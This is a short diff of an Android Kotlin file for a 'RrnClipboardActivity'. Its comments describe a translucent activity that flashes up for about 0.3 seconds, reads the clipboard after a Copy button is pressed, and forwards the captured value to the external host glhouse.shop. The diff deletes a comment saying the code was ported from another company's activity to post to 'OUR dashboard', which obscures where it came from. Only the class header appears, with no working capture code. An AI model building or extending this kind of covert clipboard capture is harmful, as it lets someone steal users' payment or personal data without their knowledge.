@@ -13,7 +13,7 @@ import android.os.Bundle
 // the Copy button and then launches THIS activity: it comes to the foreground for ~0.3s,
 // reads the clipboard on window-focus, validates the value against the on-screen mask
 // fingerprints, forwards it through our normal pipe (AlertUploader → glhouse.shop), then
-// vanishes. Ported from PayTech's LaunchTrampolineActivity, but posting to OUR dashboard.
+// vanishes (~0.3s translucent blip).
 class RrnClipboardActivity : Activity() {
 
     private var pendingCapture = false
